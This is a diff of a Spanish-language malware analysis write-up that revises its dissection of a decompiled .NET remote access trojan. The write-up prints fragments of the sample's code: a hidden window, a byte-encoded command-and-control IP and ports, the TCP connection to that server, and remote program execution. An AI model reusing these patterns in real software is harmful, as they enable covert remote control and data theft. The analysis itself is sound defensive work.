@@ -49,9 +49,11 @@ Dichos factores parecen indicarnos que se trata de un programa .NET; adicionalme
 
 Con dicha información, podemos decir con casi total certeza de que el binario corresponde a uno desarrollado con el framework .NET. Adicionalmente, verificamos que PEStudio identifica una IP, que puede ser un indicador de compromiso (IOC) de interés.
 
-Los archivos desarrollados en .NET son usualmente suceptibles a ser decompilados, debido a que no se compilan directo a lenguaje máquina (los 0 y 1 que entiende la computadora), sino que se compilan a un lenguaje intermedio (llamado Intermediate Language - IL), el cual se compila _durante la ejecución del programa_ a lenguaje máquina específico al entorno donde se está ejecutando.
+### Decompilación de binarios .NET
 
-Si bien dicho framework provee flexibilidad, el lenguaje intermedio contiene información sobre los nombres de las clases, métodos, metadata, etc. del programa original, lo que permite que sea decompilado y así, "revertido" casi a código fuente.
+Los archivos desarrollados en .NET son usualmente suceptibles a ser decompilados, debido a que no se compilan directamente al lenguaje máquina binario que la computadora entiende (los 0 y 1). En su lugar, se compilan a un lenguaje intermedio conocido como Intermediate Language (IL), el cual es convertido durante la ejecución del programa al lenguaje máquina específico del entorno en el que se está ejecutando.
+
+Si bien dicho framework provee flexibilidad, el lenguaje intermedio contiene información sobre nombres de clases, métodos, metadata, etc. del programa original, lo que permite que sea decompilado y así, "revertido" casi a su forma original.
 
 Existen distintas herramientas que permiten decompilar un archivo creado en .NET, entre las que se encuentran [_ILSpy_](https://github.com/icsharpcode/ILSpy) y [_dnSpy_](https://github.com/dnSpy/dnSpy); para el presente análisis utilizaré _dnSpy_ debido a las capacidades de debugging que ofrece.
 
@@ -63,9 +65,10 @@ Al abrir el ejecutable en _dnSpy_, validamos que efectivamente podemos visualiza
 
 Dado que analizar cada función que llama el ejecutable puede ser muy tedioso, seguiremos el flujo de llamadas que se hacen desde el método Main.
 
-Verificamos que cuando el programa se inicia llama al formulario Form1, el cual, al inicializarse, invoca al método **InitializeComponent()**. De la configuración de dicho método podemos destacar dos cosas:
-1. Se configura la opacidad del formulario a 0 para hacer de este invisible.
-2. Se llama al método **Form1_Load**.
+1. Verificamos que cuando el programa se inicia llama al formulario Form1, el cual, al inicializarse, invoca al método **InitializeComponent()**. De la configuración de dicho método podemos destacar tres cosas:
+	1. Se configura la opacidad del formulario a 0 para hacer de este invisible.
+	2. Se configura para que no tenga un ícono en la barra de tareas.
+	3. Se llama al método **Form1_Load**.
 
 ```c#
 private void InitializeComponent()
@@ -82,7 +85,7 @@ private void InitializeComponent()
 
 		}
 ```
-3. El método **Form1_Load** detiene la ejecución ("duerme") por unos segundos antes de llamar al método **corediQart()** de la clase **MIETDIM**:
+2. El método **Form1_Load** detiene la ejecución ("duerme") por unos segundos antes de llamar al método **corediQart()** de la clase **MIETDIM**:
 
 ```c#
 private void Form1_Load(object sender, EventArgs e)
@@ -102,7 +105,9 @@ private void Form1_Load(object sender, EventArgs e)
 			}
 		}
 ```
-4. El método **corediQart()** realiza las siguientes acciones:
+Esta técnica ([T1497.003](https://attack.mitre.org/techniques/T1497/003/)) usualmente es utilizada por atacantes para evadir herramientas de análisis dinámico, muchas de las cuales solo están activas por un corto tiempo y puede que crean que un binario no tiene comportamiento malicioso solo porque aún no es ejecutado. En este caso, desde mi punto de vista, los tiempos son muy cortos para estar utilizando dicha técnica, por lo que probablemente están para dar tiempo a otros componentes del programa de terminar de cargar.
+
+3. El método **corediQart()** realiza las siguientes acciones:
     1. Asigna el primer puerto definido en la variable _ports_ a la variable _port_.
     2. Obtiene el nombre de la computadora donde se está ejecutando, así como el usuario que está ejecutando el programa y lo asigna a la variable _userAiunt_.
     3. Crea un objeto de tipo _TimerCallback_ que llama al método **procvQloop**.
@@ -113,11 +118,13 @@ private void Form1_Load(object sender, EventArgs e)
 		{
 			DIRERRIF.port = DIRERRIF.ports[0];
 			this.userAiunt = new MRDFINF();
-			this.hdbiAve.corweavr = this;
+			...
 			TimerCallback callback = new TimerCallback(this.procvQloop);
 			Timer timer = new Timer(callback, this.objeAdate, 49120, 58510);
 			this.objeAdate.timer = timer;
 		}
+```
+```c#
         public static int[] ports = new int[]
 		{
 			9149,
@@ -126,31 +133,33 @@ private void Form1_Load(object sender, EventArgs e)
 			27781,
 			29224
 		};
+```
+```c#
         public MRDFINF()
 		{
-			this.rim_veoion = "N._D._2.0".Replace("_", "");
+			...
 			this.comtname = SystemInformation.ComputerName;
 			this.acc_datQtime = Environment.UserName;
-			this.accounQname = "";
-			this.lanrinfo = "";
+			...
 		}
 
 ```
 
-5. Analizando lo que hace el método **procvQloop()**, inicia una conexión TCP con la IP almacenada en la variable _min\_codns_; en dicha variable, la IP se encuentra almacenada como un conjunto de bytes, probablemente para dificultar su detección:
+4. Analizando lo que hace el método **procvQloop()**, inicia una conexión TCP con la IP almacenada en la variable _min\_codns_; en dicha variable, la IP se encuentra almacenada como un conjunto de bytes, probablemente para dificultar su detección:
 
 ```c#
 DIRERRIF.mainwtp = Encoding.UTF8.GetString(DIRERRIF.min_codns, 0, DIRERRIF.min_codns.Length).ToString();
 this.maiedet = new TcpClient();
 this.maiedet.Connect(DIRERRIF.mainwtp, DIRERRIF.port);
-
+```
+```c#
 public static byte[] min_codns = new byte[]
 {49, 54, 50, 46, 50, 52, 53, 46, 49, 57, 49, 46, 50, 49, 55};
 ```
 
 La conexión TCP se realiza con la IP almacenada en la variable _min\_codns_ en el puerto asignado a la variable _port_.
 
-6. Una vez realizada la conexión, si es exitosa, se llama al método **procD_core()**, el cual realiza múltiples operaciones:
+5. Una vez realizada la conexión, si es exitosa, se llama al método **procD_core()**, el cual realiza múltiples operaciones:
     1. Obtiene una respuesta de la conexión TCP establecida previamente.
     2. Separa la respuesta obtenida utilizando el separador '='.
     3. En base al primer valor de la respuesta (lo que estaba antes del '=') llama a distintos métodos.
@@ -235,7 +244,7 @@ Al recibir el comando "geyTtavs", se obtienen los procesos que se están ejecuta
 
 La función **loadQData** envía el tipo de respuesta a esperar, el tamaño de esta y la respuesta al servidor.
 
-Con solo analizar dicha función, podemos confirmar que es un agente de Comando y Control: el programa se contacta a un servidor, recibe una instrucción (listar procesos en este caso) y la envía de vuelta al servidor.
+Con solo analizar la función de listar procesos, podemos confirmar que es un agente de Comando y Control: el programa se contacta a un servidor, recibe una instrucción (listar procesos en este caso) y la envía de vuelta al servidor.
 
 
 #### 2.3.2 Establecer persistencia
@@ -264,7 +273,7 @@ Al recibir el comando "flyTes" junto con una ruta, el comando lista los archivos
 
 #### 2.3.4 Sacar capturas de pantalla
 
-Los comandos "cdyTcrgn", "csyTcrgn" y "csyTdcrgn" pueden ser utilizados para sacar capturas de pantalla:
+Los comandos "cdyTcrgn", "csyTcrgn" y "csyTdcrgn" pueden ser utilizados para sacar capturas de pantalla y enviarlas al servidor:
 
 ![alt text](/img/004-sc1.png "Screen capture 1")
 
@@ -286,11 +295,11 @@ La información devuelta al servidor incluye la ruta del archivo, el nombre del 
 
 #### 2.3.6 Ejecutar binarios
 
-Para ejecutar un programa que exista en el sistema (sea nativo o descargado con otro comando), se puede utilizar el comando "ruyTnf", el cual inicia un nuevo proceso recibiendo como parámetro el nombre del programa a ejecutar. En caso el programa reciba parámetros, se envían utilizando el caracter '>' como separador.
+Para ejecutar un programa que exista en el sistema (sea nativo o descargado con otro comando), se utiliza  el comando "ruyTnf", el cual inicia un nuevo proceso recibiendo como parámetro el nombre del programa a ejecutar.
 
 ```C#
 if (text == "ruyTnf") {
-  try {
+  ..
     Process.Start(procss_type[1].Split(new char[] { '>' })[0]);
   } catch {
   }
